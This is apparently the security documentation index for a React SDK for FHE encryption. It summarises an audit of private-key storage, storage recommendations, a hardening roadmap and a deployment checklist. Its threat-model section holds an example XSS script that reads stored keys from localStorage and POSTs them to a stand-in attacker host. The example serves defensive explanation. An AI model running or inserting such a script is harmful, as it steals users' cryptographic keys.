# 🔒 Security Documentation

> **Comprehensive security guidance for `@zama-fhe/sdk`**

[![Security Analysis](https://img.shields.io/badge/security-analyzed-green.svg)](./SECURITY_ANALYSIS.md)
[![Risk Level](https://img.shields.io/badge/risk-MEDIUM--HIGH-orange.svg)](./SECURITY_ANALYSIS.md)
[![OWASP](https://img.shields.io/badge/OWASP-25%25-red.svg)](./SECURITY_ANALYSIS.md)

---

## 📚 Documentation Overview

This directory contains comprehensive security analysis and implementation plans for the FHEVM React SDK. All documents are interconnected and provide different levels of detail.

### 🚀 Quick Start

**New to SDK security?** Start here:

1. **[SECURITY_QUICK_REFERENCE.md](./SECURITY_QUICK_REFERENCE.md)** ⭐
   - **Start here!** Quick TL;DR guide (5-10 min read)
   - Safe vs unsafe storage patterns
   - Configuration examples
   - Pre-deployment checklist
   - FAQ

### 📊 Detailed Analysis

**Need deeper understanding?** Read these:

2. **[SECURITY_ARCHITECTURE.md](./SECURITY_ARCHITECTURE.md)** 🎨
   - Visual diagrams of security components
   - Key storage flow diagrams
   - Threat model overview
   - Storage security hierarchy
   - Risk matrices and timelines

3. **[SECURITY_ANALYSIS.md](./SECURITY_ANALYSIS.md)**
   - Comprehensive 945-line security audit
   - 8 vulnerabilities identified and prioritized
   - OWASP compliance assessment
   - Threat modeling with attack scenarios
   - Industry standards comparison

4. **[SECURITY_IMPROVEMENT_PLAN.md](./SECURITY_IMPROVEMENT_PLAN.md)**
   - 3-phase implementation roadmap
   - Complete code examples for all features
   - `EncryptedStorageAdapter` implementation
   - `SecurityLogger` system
   - Test suite examples
   - Migration guides

### ✅ Action Items

**Ready to implement?** Use this:

5. **[SECURITY_TODO.md](./SECURITY_TODO.md)**
   - Consolidated checklist of all action items
   - Links to detailed implementation code
   - Timeline and effort estimates
   - Organized by priority

---

## 🎯 At a Glance

### Current Security Status

| Metric | Status | Details |
|--------|--------|---------|
| **Risk Level** | 🟠 MEDIUM-HIGH | Acceptable for dev, needs hardening for production |
| **OWASP Compliance** | 🔴 25% (1.5/6) | See [compliance table](./SECURITY_ANALYSIS.md#owasp-cryptographic-storage-guidelines) |
| **Encryption at Rest** | ❌ No | Keys stored in plain text |
| **Key Rotation** | ⚠️ Manual only | No automated rotation |
| **Security Documentation** | ✅ Complete | Comprehensive guides available |
| **Safe Defaults** | ✅ Yes | No default storage (forces explicit choice) |

### Critical Issues Summary

```
🔴 CRITICAL (3 issues)
├─ Private keys stored in plain text
├─ Public getter exposes private key
└─ Plain localStorage vulnerable to XSS

🟠 HIGH (1 issue)
└─ localStorage accessible to any same-origin JavaScript

🟡 MEDIUM (3 issues)
├─ No encryption at rest
├─ No key rotation mechanism
└─ Signatures cached indefinitely
```

---

## 🛡️ Security Recommendations

### ✅ For Development

```typescript
// Best: Memory storage (re-sign on refresh)
import { memoryStorage } from '@zama-fhe/sdk';

<FhevmProvider storage={memoryStorage} {...props} />
```

### ✅ For Production (Current SDK)

```typescript
// Safe: Session storage (cleared on tab close)
import { sessionStorageAdapter } from '@zama-fhe/sdk';

<FhevmProvider storage={sessionStorageAdapter} {...props} />
```

### 🔒 For Production (Future - After Phase 1)

```typescript
// Best: Encrypted storage (persistent + secure)
import { EncryptedStorageAdapter, generateDeviceKey } from '@zama-fhe/sdk';

const key = await generateDeviceKey();
const storage = new EncryptedStorageAdapter(localStorage, { key });

<FhevmProvider storage={storage} {...props} />
```

### ⚠️ What to Avoid

```typescript
// ❌ NEVER in production
import { localStorageAdapter } from '@zama-fhe/sdk';

<FhevmProvider storage={localStorageAdapter} {...props} />
// Vulnerable to XSS attacks!
```

---

## 📅 Implementation Roadmap

### Phase 1: Quick Wins (Weeks 1-2) - Non-Breaking ✅

**Status:** Planned, awaiting prioritization

| Task | Effort | Priority | Deliverable |
|------|--------|----------|-------------|
| Encrypted Storage Adapter | 3 days | 🔴 HIGH | `EncryptedStorageAdapter` class |
| Security Event Logging | 2 days | 🟠 MEDIUM | `SecurityLogger` interface |
| Security Documentation | 1 day | 🟠 MEDIUM | Docs + CSP examples |

**Impact:** Immediate security improvements, no breaking changes

### Phase 2: API Improvements (Weeks 3-4) - Soft Breaking ⚠️

**Status:** Planned for after Phase 1

| Task | Effort | Priority | Deliverable |
|------|--------|----------|-------------|
| Deprecate privateKey getter | 1 day | 🔴 HIGH | Warnings in console |
| Security Level Config | 2 days | 🟠 MEDIUM | `securityLevel` prop |
| Key Rotation Helpers | 3 days | 🟠 MEDIUM | `useKeyRotation` hook |

**Impact:** Deprecation warnings, encourages migration

### Phase 3: Breaking Changes (Months 3-4) - v2.0 ❌

**Status:** Planned for major version

| Task | Effort | Priority | Deliverable |
|------|--------|----------|-------------|
| Remove privateKey getter | 1 day | 🔴 HIGH | Breaking API change |
| Require encrypted storage | 1 day | 🟠 MEDIUM | Production enforcement |
| Remove privateKey from toJSON | 1 day | 🔴 HIGH | Breaking serialization |

**Impact:** Major version bump (v2.0), full security hardening

---

## 🚨 Threat Models

### XSS Attack (Most Common)

```javascript
// Attacker injects malicious script
for (let key of Object.keys(localStorage)) {
  if (key.startsWith('fhevm:')) {
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: localStorage.getItem(key)
    });
  }
}
```

**Protection:**
- ✅ Use `memoryStorage` or `sessionStorage`
- ✅ Configure CSP headers
- ✅ Never use plain `localStorage`

### Malicious Browser Extension

**Scenario:** Extension reads page storage

**Protection:**
- ✅ Use `memoryStorage` (extensions can't access in-memory data)
- ⚠️ `localStorage` is accessible to extensions

### Physical Device Access

**Scenario:** Attacker has physical access

**Protection:**
- ✅ Use encrypted storage with password
- ✅ Short expiration times (≤24 hours)
- ✅ Clear keys on logout

---

## 📖 Document Navigation

### By Role

**👨‍💻 Developer Using SDK**
→ Start with [SECURITY_QUICK_REFERENCE.md](./SECURITY_QUICK_REFERENCE.md)

**🔐 Security Team**
→ Read [SECURITY_ANALYSIS.md](./SECURITY_ANALYSIS.md)

**🛠️ Implementation Team**
→ Use [SECURITY_IMPROVEMENT_PLAN.md](./SECURITY_IMPROVEMENT_PLAN.md)

**📋 Project Manager**
→ Review [SECURITY_TODO.md](./SECURITY_TODO.md)

### By Use Case

**"How do I configure storage securely?"**
→ [SECURITY_QUICK_REFERENCE.md#configuration-examples](./SECURITY_QUICK_REFERENCE.md#configuration-examples)

**"What are the security risks?"**
→ [SECURITY_ANALYSIS.md#identified-vulnerabilities](./SECURITY_ANALYSIS.md#2-identified-vulnerabilities)

**"How do I implement encrypted storage?"**
→ [SECURITY_IMPROVEMENT_PLAN.md#task-11-create-encrypted-storage-adapter](./SECURITY_IMPROVEMENT_PLAN.md#task-11-create-encrypted-storage-adapter)

**"What's the implementation timeline?"**
→ [SECURITY_TODO.md#timeline-summary](./SECURITY_TODO.md#timeline-summary)

**"Is this safe for production?"**
→ [SECURITY_QUICK_REFERENCE.md#tldr---security-levels](./SECURITY_QUICK_REFERENCE.md#tldr---security-levels)

---

## ✅ Pre-Deployment Checklist

Before deploying to production, ensure:

### Storage Configuration

- [ ] Using `memoryStorage`, `sessionStorage`, or `EncryptedStorage` (NOT plain `localStorage`)
- [ ] Storage choice explicitly documented in code comments
- [ ] Environment-based storage selection (dev vs prod)

### Security Headers

- [ ] CSP headers configured on server
- [ ] HTTPS enforced (no HTTP in production)
- [ ] Proper CORS configuration

### Code Quality

- [ ] No `console.log(signature)` or `console.log(privateKey)` in production code
- [ ] Dependencies audited (`npm audit` passing)
- [ ] No deprecated API usage warnings
- [ ] Source maps disabled in production

### Key Management

- [ ] Signature expiration ≤24 hours
- [ ] Keys cleared on user logout
- [ ] Key rotation plan documented

### Monitoring

- [ ] Security event logging enabled (if available)
- [ ] Monitoring for failed decrypt attempts
- [ ] Alerts configured for suspicious activity

**Full checklist:** [SECURITY_QUICK_REFERENCE.md#pre-deployment-checklist](./SECURITY_QUICK_REFERENCE.md#pre-deployment-checklist)

---

## 🔍 Vulnerability Breakdown

### By Severity

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 CRITICAL | 2 | Planned fixes in Phase 1-2 |
| 🟠 HIGH | 1 | Mitigated with safe storage |
| 🟡 MEDIUM | 3 | Planned fixes in Phase 2-3 |
| 🟢 LOW | 2 | Documentation improvements |

### By Component

| Component | Issues | Risk |
|-----------|--------|------|
| `FhevmDecryptionSignature` | 4 | HIGH - Core security class |
| Storage adapters | 2 | MEDIUM - Mitigated with choice |
| TanStack Query caching | 1 | LOW - In-memory only |
| Documentation | 1 | LOW - Already addressed |

**Detailed analysis:** [SECURITY_ANALYSIS.md#identified-vulnerabilities](./SECURITY_ANALYSIS.md#2-identified-vulnerabilities)

---

## 📊 OWASP Compliance

### Current Compliance: 25% (1.5/6)

| OWASP Guideline | Status | Notes |
|-----------------|--------|-------|
| Encrypt sensitive data at rest | ❌ No | Plain text storage |
| Use authenticated encryption | ❌ No | No encryption layer |
| Store keys in secure keystore | ❌ No | Browser storage |
| Implement key rotation | ⚠️ Partial | Manual only, no automation |
| Minimize key exposure time | ✅ Yes | 1-day default expiration |
| Separate encryption keys from data | ❌ No | Stored together in JSON |

### Target Compliance After Phase 1: 75% (4.5/6)

With `EncryptedStorageAdapter` and security improvements:
- ✅ Encryption at rest (AES-GCM)
- ✅ Authenticated encryption
- ⚠️ Browser storage (still not hardware keystore)
- ✅ Key rotation helpers
- ✅ Short expiration times
- ⚠️ Keys still in same storage (encrypted)

**Full comparison:** [SECURITY_ANALYSIS.md#owasp-cryptographic-storage-guidelines](./SECURITY_ANALYSIS.md#owasp-cryptographic-storage-guidelines)

---

## 🆘 Support

### Security Issues

**🚨 IMPORTANT:** Do NOT create public GitHub issues for security vulnerabilities.

**Report security issues to:** security@zama.ai

### General Questions

- **GitHub Discussions:** https://github.com/zama-ai/react-sdk/discussions
- **Discord:** https://discord.fhe.org
- **Documentation:** [SECURITY_QUICK_REFERENCE.md](./SECURITY_QUICK_REFERENCE.md)

---

## 📚 External References

### Standards & Guidelines

- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [NIST Key Management Guidelines](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)
- [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)

### Web APIs

- [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)
- [IndexedDB API](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)
- [Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)

### Blockchain Standards

- [EIP-712: Typed Structured Data Hashing](https://eips.ethereum.org/EIPS/eip-712)
- [EIP-1193: Ethereum Provider JavaScript API](https://eips.ethereum.org/EIPS/eip-1193)

---

## 📝 Document Changelog

| Date | Document | Changes |
|------|----------|---------|
| 2026-02-03 | All | Initial security analysis and documentation |
| TBD | Phase 1 | Implementation of encrypted storage |
| TBD | Phase 2 | API improvements and deprecations |
| TBD | Phase 3 | Breaking changes for v2.0 |

---

## 🏆 Security Acknowledgments

This security analysis was conducted using industry best practices and standards from:

- ✅ OWASP Top 10
- ✅ NIST Cryptographic Standards
- ✅ Web3 Security Best Practices
- ✅ Metamask Security Architecture (comparison)
- ✅ Common Weakness Enumeration (CWE)

---

<div align="center">

**Last Updated:** 2026-02-03
**SDK Version:** v1.x
**Next Review:** After Phase 1 Implementation

---

**[⬆ Back to Top](#-security-documentation)**

</div>
